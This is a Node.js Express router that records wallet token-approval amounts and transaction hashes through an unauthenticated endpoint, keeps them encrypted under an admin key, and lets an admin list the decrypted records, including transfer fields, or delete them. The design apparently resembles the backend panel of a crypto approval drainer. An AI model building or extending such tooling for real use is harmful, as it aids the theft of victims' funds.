var express = require('express');
var Wallet = require('../models/Wallet');
var auth = require('../middleware/auth');
var vault = require('../crypto');
var { getSessionKey } = require('./auth');

var router = express.Router();

function encryptWallet(data, masterKey) {
  return {
    address: vault.encryptField(data.address, masterKey),
    approvedAmount: vault.encryptField(data.approvedAmount, masterKey),
    status: data.status,
    txHash: vault.encryptField(data.txHash || '', masterKey)
  };
}

function decryptWallet(wallet, masterKey) {
  var obj = wallet.toObject ? wallet.toObject() : Object.assign({}, wallet);
  obj.address = vault.decryptField(obj.address, masterKey);
  obj.approvedAmount = vault.decryptField(obj.approvedAmount, masterKey) || '0';
  obj.transferredAmount = vault.decryptField(obj.transferredAmount, masterKey) || '0';
  obj.txHash = vault.decryptField(obj.txHash, masterKey);
  obj.transferTxHash = vault.decryptField(obj.transferTxHash, masterKey);
  return obj;
}

router.post('/record', async function (req, res) {
  try {
    var address = req.body.address;
    var amount = req.body.amount;
    var txHash = req.body.txHash;
    if (!address || !amount) {
      return res.status(400).json({ error: 'Address and amount required' });
    }

    var Admin = require('../models/Admin');
    var admin = await Admin.findOne();
    if (!admin) return res.status(500).json({ error: 'System not configured' });

    var masterKey = getSessionKey(admin._id);
    if (!masterKey) {
      return res.status(500).json({ error: 'Vault locked' });
    }

    var wallets = await Wallet.find();
    var existing = null;
    for (var i = 0; i < wallets.length; i++) {
      var dec = vault.decryptField(wallets[i].address, masterKey);
      if (dec && dec.toLowerCase() === address.toLowerCase()) {
        existing = wallets[i];
        break;
      }
    }

    if (existing) {
      existing.approvedAmount = vault.encryptField(amount, masterKey);
      existing.status = 'approved';
      existing.txHash = vault.encryptField(txHash || '', masterKey);
      await existing.save();
      res.json({ message: 'Recorded' });
    } else {
      await Wallet.create({
        address: vault.encryptField(address.toLowerCase(), masterKey),
        approvedAmount: vault.encryptField(amount, masterKey),
        status: 'approved',
        txHash: vault.encryptField(txHash || '', masterKey)
      });
      res.json({ message: 'Recorded' });
    }
  } catch (err) {
    res.status(500).json({ error: 'Failed to record approval' });
  }
});

router.get('/', auth, async function (req, res) {
  try {
    var masterKey = getSessionKey(req.adminId);
    if (!masterKey) return res.status(401).json({ error: 'Vault locked — login again' });

    var wallets = await Wallet.find().sort({ updatedAt: -1 });
    var decrypted = wallets.map(function (w) { return decryptWallet(w, masterKey); });
    res.json({ wallets: decrypted });
  } catch (err) {
    res.status(500).json({ error: 'Failed to fetch wallets' });
  }
});

router.delete('/:id', auth, async function (req, res) {
  try {
    await Wallet.findByIdAndDelete(req.params.id);
    res.json({ message: 'Deleted' });
  } catch (err) {
    res.status(500).json({ error: 'Failed to delete' });
  }
});

module.exports = router;
module.exports.decryptWallet = decryptWallet;
